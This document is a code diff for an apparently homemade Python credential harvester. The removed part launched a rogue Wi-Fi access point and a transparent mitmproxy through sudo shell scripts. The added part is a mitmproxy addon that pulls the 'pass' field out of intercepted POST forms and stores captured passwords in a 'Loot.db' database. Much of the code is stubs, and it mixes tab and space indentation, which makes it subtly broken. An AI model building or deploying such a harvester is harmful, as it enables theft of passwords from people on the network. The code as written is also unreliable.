@@ -1,90 +1,119 @@
-import sys, os, subprocess, tempfile, datetime, time, signal
+import mitmproxy, sqlite3, random
 
-class MITM_Main:
-
+class MITM_Interface:
 
 	def __init__(self):
-		self.isUp = False
-		self.usb_int = "wlan0"
-		self.mon_int = "wlan0mon"
-		self.mon_mode = False
-		self.welcome()
+		self.dbName = "Loot.db"
+		self.connex = sqlite3.connect(self.dbName)
+		self.cur = self.connex.cursor()
+		self.cpu_factor = 0
 
-	def switch_ap_on(self):
-		if not self.isUp:
-			print("switching on access point...")
-			pid = os.fork()
-			if pid > 0:
-				os.system("sudo xterm -e ./RAP.sh start")
-				os.wait()
-				os.kill(pid, signal.SIGTERM)
-			print("waiting for RAP.sh to finish...")
-			time.sleep(15)
-			self.isUp = True
-			pid2 = os.fork()
-			if pid2 > 0:
-				os.system("sudo xterm -e ./RAP2.sh")
-				os.wait()
-				os.kill(pid2, signal.SIGTERM)
-			time.sleep(15)
-			print("starting mitmproxy...")
-			pid3 = os.fork()
-			if pid3 > 0:
-				os.system("sudo xterm -e mitmproxy -T --host")
-				os.wait()
-				os.kill(pid3, signal.SIGTERM)
-			now = datetime.datetime.now()
-			print("access point started at ", now)
-		else:
-			print("access point is already up")
+	def tableA_vals(self, user_id, pword_id, associated_account, password_length, strength):
+		return {"user_id" : user_id,
+		"pword_id" : pword_id,
+		"associated_account" : associated_account,
+		"password_length" : password_length,
+		"strength" : strength}
 
-	def switch_ap_off(self):
-		if not self.isUp and not self.mon_mode:
-			print("ap isnt even on")
-		else:
-			pid = os.fork()
-			if pid > 0:
-				os.system("sudo xterm -e ./RAP.sh stop")
-				os.wait()
-				os.kill(pid, signal.SIGTERM)
-			self.isUp = False
-			print("access point switched off")
+	def tableB_vals(self,user_id, number_shared_passwords):
+		return {"user_id" : user_id,
+		"number_shared_passwords" : number_shared_passwords}
 
-	def welcome(self):
-		print("*****HEY THERE*****")
-		picd = True
-		while picd:
-			resp = input("please select an option number:\n" \
-							"1.Switch Access Point On\n" \
-							"2.Switch Access Point Off\n" \
-							"3.See AP Details\n"\
-							"4.See passwords so far\n"\
-							"5.exit\n")
-			try:
-				resp = int(resp)
-			except ValueError:
-				pass
-			if resp not in range(1,6):
-				pass
-			else:
-				picd = False
-		if resp == 1:
-			self.switch_ap_on()
-			self.welcome()
-		elif resp == 2:
-			self.switch_ap_off()
-			self.welcome()
-		elif resp == 3:
-			print("no")
-			self.welcome()
-		elif resp == 4:
-			print("no")
-			self.welcome()
-		elif resp == 5:
-			os.system("sudo pkill airodump-ng && sudo pkill python3")  #this is stupid but it works
-			sys.exit(0)
+	def assign_strength(self, password):
+		'''assigns a password a "strength" value determined by: 
+		# of permutations of characters, 
+		password length, 
+		distribution of unique characters,
+		self.cpu_factor (approximate cpu clockspeed)
+
+		--> number of years to crack?
+		'''
+		pass
+
+	def new_user_id(self):
+		pass
+
+	def check_for_shared_passwords(self):
+		'''checks traffic for shared passwords'''
+		pass
+
+	def read_traffic(self, account, password):
+		'''makes decisions based on account names and passwords from mitmproxy : inserts into table(s), makes a new userID, etc'''
+		self.check_for_shared_passwords()
+		pass
+
+    def initTableA(self):
+        query = 'CREATE TABLE IF NOT EXISTS TableA' \
+                '(user_id TEXT PRIMARY KEY NOT NULL,' \
+                'pword_id TEXT UNIQUE NOT NULL,' \
+                'associated_account TEXT NOT NULL,' \
+                'strength INTEGER NOT NULL)'
+        self.cur.execute(query)
+        self.connex.commit()
+
+    def insert_into_tables(self, user_id, pword_id, associated_account, password_length, strength, number_shared_passwords):
+        try:
+            self.cur.execute("INSERT OR IGNORE INTO TableA VALUES (?,?,?,?,?)", [user_id, pword_id, associated_account, password_length, strength])
+            self.connex.commit()
+            self.cur.execute("INSERT OR IGNORE INTO TableB VALUES (?,?)", [user_id, number_shared_passwords])
+            self.connex.commit()
+            print("successfully inserted records into tables...")
+        except sqlite3.Error as SQE:
+            print("error inserting record:", SQE)
+            pass
+
+    def initTableB(self):
+        query = 'CREATE TABLE IF NOT EXISTS TableB' \
+                '(user_id TEXT PRIMARY KEY NOT NULL,' \
+                'number_shared_passwords INTEGER NOT NULL)'
+        self.cur.execute(query)
+        self.connex.commit()
 
 
-if __name__ == "__main__":
-	mal = MITM_Main()
+	def view_db(self):
+        print("Current stored passwords:")
+        try:
+            table_a = self.cur.execute('SELECT * FROM TableA')
+            table_a = self.cur.fetchall()
+            table_b = self.cur.execute('SELECT * FROM TableB')
+            table_b = self.cur.fetchall()
+            self.connex.commit()
+            i, j = 1, 1
+            for row in table_a:
+                print(str(i), ">", "| USER_ID:", row[0], "| PWORD_ID:", row[1], "| ASSOCIATED_ACCOUNT:", row[2], "| STRENGTH:", row[3], "|","| BRUTEFORCE_FACTOR:", row[4])
+                i +=1
+        	print("//////////////////")
+            for row in table_b:
+                print(str(i), ">", "| USER_ID:", row[0],"| NUMBER_SHARED_PASSWORDS:", row[1])
+                j +=1
+        except UnicodeEncodeError:
+            print("error printing tables")
+            pass
+        except sqlite3.OperationalError as SQE:
+            print("error selecting from a table: ", SQE)
+            pass
 
+
+
+class Get_Pwords:
+
+	def request(self,flow):
+		'''
+		MITM_Interface instantiated here 
+		--> picks account name, passwords from mitmproxy traffic
+		'''
+		mitm_script = MITM_Interface()
+		if flow.request.urlencoded_form and flow.request.method == 'POST':
+			form = flow.request.urlencoded_form
+			if "pass" in form:
+				print(form['pass'])
+			'''
+				from traffic, get:
+					* passwords
+					* relevant site name (--> account_name)
+
+					mitm_script.read_traffic(account, password)
+			'''
+
+def start():
+	return Get_Pwords()
